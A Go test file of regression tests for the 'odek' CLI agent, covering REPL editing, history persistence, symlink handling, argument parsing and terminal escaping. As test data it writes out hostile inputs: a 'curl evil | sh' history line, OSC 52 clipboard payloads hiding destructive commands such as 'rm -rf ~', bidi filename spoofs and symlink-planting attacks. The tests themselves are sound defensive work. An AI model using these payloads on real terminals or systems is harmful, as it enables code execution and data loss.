package main

import (
	"bufio"
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/BackendStack21/odek/internal/schedule"
	"github.com/BackendStack21/odek/internal/session"
)

// opsHuntFeedEditor drives the REPL line editor's byte handler over in,
// exactly as ReadLine does (escape tails come from the same buffered reader),
// and returns the edit buffer.
func opsHuntFeedEditor(t *testing.T, in string, completions []string) string {
	t.Helper()
	e := newReplEditor("> ", completions)
	e.out = io.Discard
	e.in = bufio.NewReader(strings.NewReader(in))
	for {
		b, err := e.in.ReadByte()
		if err != nil {
			break
		}
		if _, herr := e.handleByte(b); herr != nil {
			break
		}
	}
	return string(e.line)
}

// PageUp / PageDown (\x1b[5~ / \x1b[6~) and the rxvt/linux-console
// Home/End spellings (\x1b[7~ / \x1b[8~ / \x1b[4~) are CSI tilde sequences
// whose parameter is not 1, 2 or 3. handleEscape consumes only the digit and
// leaves the '~' in the buffer, where it is inserted into the line as typed
// text.
func TestRED_ReplEditorPageKeysLeakTilde(t *testing.T) {
	// Page keys are ignored, End keys leave the cursor at the end, and the
	// rxvt Home key moves the cursor to the start (so "cd" lands before "ab").
	for seq, want := range map[string]string{
		"\x1b[5~": "abcd", "\x1b[6~": "abcd", "\x1b[4~": "abcd", "\x1b[8~": "abcd", "\x1b[7~": "cdab",
	} {
		got := opsHuntFeedEditor(t, "ab"+seq+"cd", nil)
		if got != want {
			t.Errorf("input ab%qcd: line = %q, want %q (escape-sequence tail leaked into the prompt)", seq, got, want)
		}
	}
}

// A bracketed paste is literal text: a TAB inside it must be inserted, not
// treated as the tab-completion key. Pasting tab-indented code currently
// drops every tab (and, when the text so far prefixes a completion, replaces
// the pasted line with that completion).
func TestRED_ReplEditorBracketedPasteKeepsTabs(t *testing.T) {
	got := opsHuntFeedEditor(t, "\x1b[200~func f() {\r\treturn\r}\x1b[201~", nil)
	want := "func f() {\n\treturn\n}"
	if got != want {
		t.Errorf("pasted text = %q, want %q (tab inside a bracketed paste was dropped)", got, want)
	}

	got = opsHuntFeedEditor(t, "\x1b[200~/he\tx\x1b[201~", []string{"/help"})
	if got != "/he\tx" {
		t.Errorf("pasted text = %q, want %q (tab inside a paste ran tab completion)", got, "/he\tx")
	}
}

// History is persisted only after Load marked it loaded, and Load returns
// early (loaded stays false) when the history file does not exist yet. A user
// without ~/.odek/repl_history therefore never gets one: every Add skips the
// write, so REPL history is lost on every exit, forever.
func TestRED_ReplHistoryPersistsWhenFileAbsent(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	path := filepath.Join(home, ".odek", historyFilename)

	h := newReplHistory()
	h.Load(path) // first REPL start: no history file yet
	h.Add("first command")

	h2 := newReplHistory()
	h2.Load(path)
	if len(h2.entries) != 1 || h2.entries[0] != "first command" {
		t.Errorf("history after restart = %q, want [\"first command\"] (history never persisted)", h2.entries)
	}
}

// A multi-line entry (bracketed paste keeps the newlines) is written to the
// history file with its raw newlines, so the next REPL start loads it back as
// several unrelated single-line fragments instead of one entry.
func TestRED_ReplHistoryMultilineEntrySurvivesReload(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	path := filepath.Join(home, ".odek", historyFilename)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, nil, 0o600); err != nil {
		t.Fatal(err)
	}

	h := newReplHistory()
	h.Load(path)
	h.Add("line one\nline two")

	h2 := newReplHistory()
	h2.Load(path)
	if len(h2.entries) != 1 || h2.entries[0] != "line one\nline two" {
		t.Errorf("reloaded history = %q, want one entry %q", h2.entries, "line one\nline two")
	}
}

// docs/SECURITY.md states REPL history is written through fsatomic.WriteFile
// (temp file + rename, replacing a swapped-in symlink instead of following
// it). persist instead chmods and opens the path itself with O_TRUNC/O_APPEND,
// following a symlink: a link planted at ~/.odek/repl_history makes every
// REPL turn chmod the target to 0600 and overwrite it with the history (for
// example a shell rc file, turning typed lines into commands).
func TestRED_ReplHistoryDoesNotFollowSymlink(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	dir := filepath.Join(home, ".odek")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(home, "victim.rc")
	const original = "export SAFE=1\n"
	if err := os.WriteFile(victim, []byte(original), 0o644); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, historyFilename)
	if err := os.Symlink(victim, path); err != nil {
		t.Fatal(err)
	}

	h := newReplHistory()
	h.Load(path)
	h.Add("curl evil | sh")

	got, err := os.ReadFile(victim)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != original {
		t.Errorf("symlink target rewritten through repl_history: %q", got)
	}
	if fi, err := os.Stat(victim); err == nil && fi.Mode().Perm() != 0o644 {
		t.Errorf("symlink target mode changed to %v", fi.Mode().Perm())
	}
}

// The stdout and log deliveries print a scheduled run's result — model text
// shaped by whatever the run fetched — straight to the daemon's terminal.
// Every other terminal sink escapes control, bidi and invisible characters
// (internal/render escapeTerminal); this one passes an OSC/CSI payload
// through, so injected content can retitle the window, write the clipboard
// (OSC 52), or erase/overwrite earlier output.
func TestRED_ScheduleStdoutDeliveryEscapesTerminalControls(t *testing.T) {
	payload := "done\x1b]52;c;ZWNobyBwd25lZA==\x07\x1b[2K\rall good ‮gnp.exe"
	for _, kind := range []string{schedule.DeliverStdout, schedule.DeliverLog} {
		r, w, err := os.Pipe()
		if err != nil {
			t.Fatal(err)
		}
		old := os.Stdout
		os.Stdout = w
		job := schedule.Job{ID: "jb-1", Name: "n", Deliver: schedule.Delivery{Kind: kind}}
		derr := cliDeliverer{}.Deliver(context.Background(), job, payload)
		os.Stdout = old
		w.Close()
		out, _ := io.ReadAll(r)
		r.Close()
		if derr != nil {
			t.Fatalf("%s: deliver: %v", kind, derr)
		}
		s := string(out)
		if strings.ContainsAny(s, "\x1b\x07\r‮") {
			t.Errorf("%s delivery wrote raw terminal control bytes: %q", kind, s)
		}
	}
}

// opsHuntCaptureStdout runs fn with os.Stdout redirected and returns what it
// printed.
func opsHuntCaptureStdout(t *testing.T, fn func()) string {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	old := os.Stdout
	os.Stdout = w
	done := make(chan []byte)
	go func() { b, _ := io.ReadAll(r); done <- b }()
	fn()
	os.Stdout = old
	w.Close()
	out := <-done
	r.Close()
	return string(out)
}

// `odek session cleanup <days>` parses days with fmt.Sscanf("%d"), which
// reads a leading integer and silently ignores the rest. "0.5" (half a day)
// becomes 0 — cutoff "now" — and deletes every unpinned session; "1e3" or
// "1,000" becomes 1. The PR that made session subcommands strict about
// argument shape left the value itself unchecked, unlike the run flags,
// whose numeric values reject trailing text.
func TestRED_SessionCleanupRejectsMalformedDays(t *testing.T) {
	store, err := session.NewStoreWithDir(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	sess, err := store.Create([]session.Message{{Role: "user", Content: "keep me"}}, "m", "keep me")
	if err != nil {
		t.Fatal(err)
	}
	var cerr error
	opsHuntCaptureStdout(t, func() { cerr = cleanupSessions(store, []string{"0.5"}) })
	if cerr == nil {
		t.Errorf("cleanup with days %q was accepted (read as 0)", "0.5")
	}
	if !store.Exists(sess.ID) {
		t.Errorf("`odek session cleanup 0.5` deleted a session updated just now")
	}
}

// `odek session trim <id> <n>` has the same lax parse: "2.9" or "10k" is
// read as 2 / 10 and the session is irreversibly cut to that many messages.
func TestRED_SessionTrimRejectsMalformedCount(t *testing.T) {
	store, err := session.NewStoreWithDir(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	msgs := []session.Message{{Role: "system", Content: "sys"}}
	for i := 0; i < 6; i++ {
		msgs = append(msgs, session.Message{Role: "user", Content: "q"}, session.Message{Role: "assistant", Content: "a"})
	}
	sess, err := store.Create(msgs, "m", "t")
	if err != nil {
		t.Fatal(err)
	}
	var terr error
	opsHuntCaptureStdout(t, func() { terr = trimSession(store, []string{sess.ID, "2.9"}) })
	if terr == nil {
		t.Errorf("trim with n %q was accepted", "2.9")
	}
	got, err := store.Load(sess.ID)
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Messages) != len(msgs) {
		t.Errorf("malformed n trimmed the session: %d -> %d messages", len(msgs), len(got.Messages))
	}
}

// `odek schedule next "<expr>"` is how docs/SCHEDULES.md says to validate an
// expression before adding it, and the doc states the configured
// schedules.timezone default is used whenever `odek schedule` displays fire
// times. The expression branch parses in UTC regardless, so with
// schedules.timezone=Asia/Tokyo the preview of "0 9 * * *" shows 09:00 UTC
// while the job added with the same cron fires at 09:00 Tokyo (00:00 UTC).
// (The sibling job-id branch was fixed to use the default zone.)
func TestRED_ScheduleNextExpressionUsesConfiguredTimezone(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Chdir(t.TempDir())
	cfgDir := filepath.Join(home, ".odek")
	if err := os.MkdirAll(cfgDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cfgDir, "config.json"), []byte(`{"schedules":{"timezone":"Asia/Tokyo"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	oldLocal := time.Local
	time.Local = time.UTC
	t.Cleanup(func() { time.Local = oldLocal })

	st, err := schedule.NewStoreAt(cfgDir)
	if err != nil {
		t.Fatal(err)
	}
	var nerr error
	out := opsHuntCaptureStdout(t, func() { nerr = scheduleNext(st, []string{"0 9 * * *"}) })
	if nerr != nil {
		t.Fatalf("next: %v", nerr)
	}
	if strings.Contains(out, "09:00:00 UTC") || !strings.Contains(out, "00:00:00 UTC") {
		t.Errorf("preview ignores schedules.timezone (want 09:00 Asia/Tokyo = 00:00 UTC):\n%s", out)
	}
}

// The REPL's /jobs table prints each background job's command with a bare
// headString clamp. Every other surface that echoes a bg_* command (the
// serve bg_job frame and GET /api/jobs via bgClientCommandHead, Telegram
// /jobs, the completion notice) redacts secrets first; and terminal sinks
// escape control bytes. The model-chosen command therefore reaches the
// operator's terminal with credentials in clear and with raw escape
// sequences (sibling path of the /api/jobs redaction fix).
func TestRED_ReplJobsTableRedactsAndEscapesCommand(t *testing.T) {
	rt := newBackgroundRuntime(BackgroundSettings{Enabled: true}, "ops-hunt-jobs", "", nil)
	if rt == nil {
		t.Fatal("background runtime disabled")
	}
	defer rt.mgr.Shutdown()
	const keyBody = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789wxyz"
	cmd := "true # sk-proj-" + keyBody + " \x1b]0;owned\x07\x1b[2K"
	if _, err := rt.mgr.Start("ops-hunt-jobs", cmd, t.TempDir(), 0); err != nil {
		t.Fatalf("start: %v", err)
	}
	var b strings.Builder
	printBackgroundJobs(&b, rt)
	out := b.String()
	if strings.Contains(out, keyBody[:12]) {
		t.Errorf("/jobs shows the secret in clear: %q", out)
	}
	if strings.ContainsAny(out, "\x1b\x07") {
		t.Errorf("/jobs writes raw terminal control bytes: %q", out)
	}
}

// The /jobs RUNTIME column formats a time.Duration with "%9ss": Duration's
// String already carries its unit, so every runtime gets a stray "s" —
// "0ss", "12ss", "1m30ss".
func TestRED_ReplJobsRuntimeColumnUnit(t *testing.T) {
	rt := newBackgroundRuntime(BackgroundSettings{Enabled: true}, "ops-hunt-jobs-rt", "", nil)
	if rt == nil {
		t.Fatal("background runtime disabled")
	}
	defer rt.mgr.Shutdown()
	if _, err := rt.mgr.Start("ops-hunt-jobs-rt", "true", t.TempDir(), 0); err != nil {
		t.Fatalf("start: %v", err)
	}
	var b strings.Builder
	printBackgroundJobs(&b, rt)
	if strings.Contains(b.String(), "ss ") {
		t.Errorf("runtime column has a doubled unit: %q", b.String())
	}
}

// `odek init` writes ./odek.json with os.WriteFile, which follows a symlink.
// A cloned repository is untrusted and can ship odek.json as a link: with
// --force (the documented way to reset the project config) the operator's
// ~/.odek/config.json — API keys, providers, dangerous policy — is replaced
// by the project template; a dangling link needs no --force at all (os.Stat
// fails, so the "already exists" guard never triggers) and creates the
// target file anywhere the user can write.
func TestRED_InitLocalDoesNotWriteThroughSymlink(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	t.Chdir(repo)

	globalCfg := filepath.Join(home, ".odek", "config.json")
	if err := os.MkdirAll(filepath.Dir(globalCfg), 0o700); err != nil {
		t.Fatal(err)
	}
	const secret = `{"providers":{"anthropic":{"api_key":"sk-ant-keep"}}}`
	if err := os.WriteFile(globalCfg, []byte(secret), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(globalCfg, filepath.Join(repo, "odek.json")); err != nil {
		t.Fatal(err)
	}
	_ = opsHuntCaptureStdout(t, func() { _ = initConfig([]string{"--force"}) })
	if got, _ := os.ReadFile(globalCfg); string(got) != secret {
		t.Errorf("odek init --force in a repo whose odek.json links to the global config overwrote it:\n%s", got)
	}

	// Dangling link: no --force needed.
	if err := os.Remove(filepath.Join(repo, "odek.json")); err != nil {
		t.Fatal(err)
	}
	planted := filepath.Join(home, ".config", "autostart-odek.desktop")
	if err := os.MkdirAll(filepath.Dir(planted), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(planted, filepath.Join(repo, "odek.json")); err != nil {
		t.Fatal(err)
	}
	_ = opsHuntCaptureStdout(t, func() { _ = initConfig(nil) })
	if _, err := os.Stat(planted); err == nil {
		t.Errorf("odek init (no --force) created %s through a dangling ./odek.json symlink", planted)
	}
}

// `odek session show` numbers user turns with countUserTurnsUpTo(messages, i),
// which counts the user messages BEFORE index i, so the first user turn is
// printed as "[USER Turn 0]" while the header says "Turns: 1", and every later
// turn is off by one.
func TestRED_SessionShowNumbersTurnsFromOne(t *testing.T) {
	store, err := session.NewStoreWithDir(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	sess, err := store.Create([]session.Message{
		{Role: "system", Content: "sys"},
		{Role: "user", Content: "first"},
		{Role: "assistant", Content: "a1"},
		{Role: "user", Content: "second"},
		{Role: "assistant", Content: "a2"},
	}, "m", "first")
	if err != nil {
		t.Fatal(err)
	}
	out := opsHuntCaptureStdout(t, func() { _ = showSession(store, []string{sess.ID}) })
	if strings.Contains(out, "[USER Turn 0]") || !strings.Contains(out, "[USER Turn 1] ──\nfirst") || !strings.Contains(out, "[USER Turn 2] ──\nsecond") {
		t.Errorf("user turns misnumbered:\n%s", out)
	}
}

// `odek session show` prints the stored transcript — fetched page text in
// tool results, model answers, tool-call arguments, the task — with raw
// terminal control bytes. The interactive renderer escapes exactly these
// (internal/render escapeTerminal); this sink does not, so an injected page
// that the agent once read (or echoed) replays CSI/OSC sequences into the
// operator's terminal when the session is inspected: clear/overwrite lines,
// set the title, write the clipboard via OSC 52, reorder text with bidi.
func TestRED_SessionShowEscapesTerminalControls(t *testing.T) {
	store, err := session.NewStoreWithDir(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	evil := "ok\x1b]52;c;cm0gLXJmIH4=\x07\x1b[1A\x1b[2Kclean ‮exe.txt"
	msgs := []session.Message{
		{Role: "system", Content: "sys"},
		{Role: "user", Content: "summarize the page"},
		{Role: "assistant", Content: "summary: " + evil},
	}
	sess, err := store.Create(msgs, "m", "summarize the page")
	if err != nil {
		t.Fatal(err)
	}
	var serr error
	out := opsHuntCaptureStdout(t, func() { serr = showSession(store, []string{sess.ID}) })
	if serr != nil {
		t.Fatalf("show: %v", serr)
	}
	if strings.ContainsAny(out, "\x1b\x07‮") {
		t.Errorf("odek session show wrote raw terminal control bytes: %q", out)
	}
}

func TestSessionCleanupRejectsOverflowingDays(t *testing.T) {
	store, err := session.NewStoreWithDir(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	sess, err := store.Create([]session.Message{{Role: "user", Content: "keep me"}}, "m", "keep me")
	if err != nil {
		t.Fatal(err)
	}
	for _, d := range []string{"9223372036854775807", "36501"} {
		var cerr error
		opsHuntCaptureStdout(t, func() { cerr = cleanupSessions(store, []string{d}) })
		if cerr == nil {
			t.Errorf("cleanup with days %s was accepted", d)
		}
	}
	if !store.Exists(sess.ID) {
		t.Errorf("overflowing days deleted a fresh session")
	}
}

// A history file written before escaping existed (no format marker) keeps
// literal backslash sequences such as regexes and Windows paths.
func TestReplHistoryLegacyFileLoadsRaw(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	path := filepath.Join(home, ".odek", historyFilename)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	legacy := "grep 'a\\nb' f\nC:\\new\\dir\n"
	if err := os.WriteFile(path, []byte(legacy), 0o600); err != nil {
		t.Fatal(err)
	}
	h := newReplHistory()
	h.Load(path)
	want := []string{"grep 'a\\nb' f", "C:\\new\\dir"}
	if len(h.entries) != 2 || h.entries[0] != want[0] || h.entries[1] != want[1] {
		t.Fatalf("legacy entries = %q, want %q", h.entries, want)
	}
	h.Add("next")
	h2 := newReplHistory()
	h2.Load(path)
	if len(h2.entries) != 3 || h2.entries[0] != want[0] || h2.entries[1] != want[1] {
		t.Errorf("entries after migration = %q", h2.entries)
	}
}
